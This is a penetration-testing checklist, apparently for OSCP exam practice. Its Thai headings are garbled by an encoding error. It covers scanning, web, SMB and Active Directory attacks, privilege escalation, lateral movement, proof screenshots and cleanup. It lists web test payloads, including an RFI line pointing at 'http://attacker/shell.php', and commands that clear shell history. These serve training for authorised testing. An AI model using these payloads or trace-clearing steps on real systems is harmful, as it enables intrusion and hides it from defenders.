# Pentest Checklist

> **Checklist ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÉ‡∏ä‡πâ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö ‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ‡∏û‡∏•‡∏≤‡∏î‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç**

---

## üìã Pre-Engagement

- [ ] ‡∏Å‡∏≥‡∏´‡∏ô‡∏î scope ‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô
- [ ] ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ variables (`$rhost`, `$lhost`, `$lport`)
- [ ] ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏° VPN connection
- [ ] ‡πÄ‡∏õ‡∏¥‡∏î note-taking (Obsidian, Cherry Tree)
- [ ] ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö target

---

## üîç Phase 1: Reconnaissance

### Port Scanning

- [ ] Full TCP scan: `nmap -sC -sV -p- $rhost -oN nmap_full.txt`
- [ ] UDP top 100: `nmap -sU --top-ports 100 $rhost -oN nmap_udp.txt`
- [ ] Vuln scripts: `nmap --script vuln $rhost`
- [ ] ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å ports ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡∏¥‡∏î

### Service Identification

| Port | Service | Status |
|------|---------|--------|
| 21 | FTP | [ ] Checked |
| 22 | SSH | [ ] Checked |
| 25 | SMTP | [ ] Checked |
| 53 | DNS | [ ] Checked |
| 80/443 | HTTP/S | [ ] Checked |
| 135 | MSRPC | [ ] Checked |
| 139/445 | SMB | [ ] Checked |
| 389/636 | LDAP | [ ] Checked |
| 1433 | MSSQL | [ ] Checked |
| 3306 | MySQL | [ ] Checked |
| 3389 | RDP | [ ] Checked |
| 5985 | WinRM | [ ] Checked |

---

## üåê Phase 2: Web Enumeration (Port 80/443)

### Basic Checks

- [ ] View source code
- [ ] Check robots.txt, sitemap.xml
- [ ] Check /admin, /login, /backup
- [ ] Identify technologies (Wappalyzer/WhatWeb)
- [ ] Check for version numbers

### Directory & File Discovery

- [ ] Gobuster/Feroxbuster scan
- [ ] FFuf parameter fuzzing
- [ ] Subdomain enumeration (if applicable)
- [ ] Virtual host fuzzing

### Vulnerability Testing

- [ ] SQLi: `'`, `"`, `1 OR 1=1`, `' OR '1'='1`
- [ ] XSS: `<script>alert(1)</script>`
- [ ] LFI: `../../../etc/passwd`
- [ ] RFI: `http://attacker/shell.php`
- [ ] Command injection: `; id`, `| whoami`
- [ ] SSRF: internal URLs
- [ ] SSTI: `{{7*7}}`, `${7*7}`
- [ ] XXE: XML injection
- [ ] File upload bypass

---

## üìÅ Phase 3: SMB Enumeration (Port 445)

- [ ] Null session: `smbclient -L //$rhost -N`
- [ ] List shares: `smbmap -H $rhost`
- [ ] Enumerate users: `enum4linux -a $rhost`
- [ ] Check for accessible shares
- [ ] Download interesting files
- [ ] Check for EternalBlue (MS17-010)

---

## üè¢ Phase 4: Active Directory

### Enumeration

- [ ] Anonymous LDAP bind
- [ ] RPC null session
- [ ] Get domain users
- [ ] Get domain groups
- [ ] BloodHound collection

### Attack Vectors

- [ ] AS-REP Roasting
- [ ] Kerberoasting
- [ ] Password spraying
- [ ] Check for unconstrained delegation
- [ ] Check for ADCS vulnerabilities (Certipy)

---

## üöÄ Phase 5: Initial Access

### Credentials Found

| Service | Username | Password | Status |
|---------|----------|----------|--------|
| | | | [ ] Tested |
| | | | [ ] Tested |
| | | | [ ] Tested |

### Shell Methods

- [ ] SSH with creds
- [ ] WinRM (evil-winrm)
- [ ] PSExec/WMIExec
- [ ] RDP
- [ ] Web shell upload
- [ ] Exploit CVE

### After Getting Shell

- [ ] Stabilize shell (TTY upgrade)
- [ ] `whoami /all` or `id`
- [ ] Check current directory
- [ ] Get user flag üö©
- [ ] **Screenshot proof** (OSCP)

---

## ‚¨ÜÔ∏è Phase 6: Privilege Escalation

### Linux

- [ ] `sudo -l` (sudo permissions)
- [ ] SUID binaries: `find / -perm -4000 2>/dev/null`
- [ ] Capabilities: `getcap -r / 2>/dev/null`
- [ ] Cron jobs: `/etc/crontab`
- [ ] Writable paths
- [ ] Kernel version & exploits
- [ ] Run linpeas.sh
- [ ] Check for interesting files

### Windows

- [ ] `whoami /priv` (privileges)
- [ ] SeImpersonatePrivilege ‚Üí Potato
- [ ] SeBackupPrivilege ‚Üí Registry dump
- [ ] Unquoted service paths
- [ ] Weak service permissions
- [ ] AlwaysInstallElevated
- [ ] Stored credentials
- [ ] Run winPEAS.exe
- [ ] Check scheduled tasks

### After Privilege Escalation

- [ ] Get root/admin flag üö©
- [ ] **Screenshot proof** (OSCP)
- [ ] Dump hashes/credentials
- [ ] Look for lateral movement opportunities

---

## üîÄ Phase 7: Lateral Movement (AD)

- [ ] Pass-the-Hash
- [ ] Pass-the-Ticket
- [ ] Over-Pass-the-Hash
- [ ] DCSync (if DA/high privs)
- [ ] Pivot to other machines
- [ ] Check trust relationships

---

## üì∏ Phase 8: Documentation (OSCP)

### Required Screenshots

- [ ] `whoami` / `id` command
- [ ] IP address proof (`ip a` / `ipconfig`)
- [ ] User flag with `type` or `cat`
- [ ] Root flag with `type` or `cat`

### Screenshot Commands

**Linux:**

```shell
cat /home/*/local.txt && hostname && ip a | grep inet
cat /root/proof.txt && hostname && ip a | grep inet
```

**Windows:**

```cmd
type C:\Users\*\Desktop\local.txt && hostname && ipconfig
type C:\Users\Administrator\Desktop\proof.txt && hostname && ipconfig
```

---

## üßπ Phase 9: Cleanup

### Remove Traces

- [ ] Delete uploaded files/shells
- [ ] Clear command history
- [ ] Remove created users
- [ ] Restore modified files

### Cleanup Commands

**Linux:**

```shell
# Clear history
history -c && history -w
cat /dev/null > ~/.bash_history

# Remove uploaded files
rm -f /tmp/linpeas.sh /tmp/shell.elf

# Check for created users
cat /etc/passwd | tail -5
```

**Windows:**

```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# Remove uploaded files
del C:\Temp\winPEAS.exe
del C:\Windows\Temp\nc.exe

# Check for created users
net user
```

---

## üîß Common Issues Checklist

- [ ] Firewall blocking reverse shell? Try port 80/443
- [ ] No outbound? Try bind shell
- [ ] AV blocking tools? Use obfuscation
- [ ] Shell dying? Migrate/stabilize
- [ ] Exploit not working? Check architecture (x86/x64)
- [ ] Kerberos failing? Sync time with DC
- [ ] MSSQL xp_cmdshell not working? Enable it first
- [ ] Pass-the-hash failing? Check NTLM vs LM hash format

---

## üîó Quick Reference Links

| Topic | File |
|-------|------|
| Emergency Commands | [Emergency-Commands.md](Emergency-Commands.md) |
| Port Enumeration | [Port-Scanning.md](../1.Scanning/Port-Scanning.md) |
| Reverse Shells | [6.3.Reverse-Shell.md](../6.OS-Command/6.3.Reverse-Shell.md) |
| Linux PrivEsc | [4.2.Privilege-Escalation-Linux.md](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md) |
| Windows PrivEsc | [4.1.Privilege-Escalation-Windows.md](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md) |
| AD Attacks | [3.AD-Exploit/](../3.AD-Exploit/) |
| OSCP Guide | [9.1.OSCP-Exam-Guide.md](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md) |
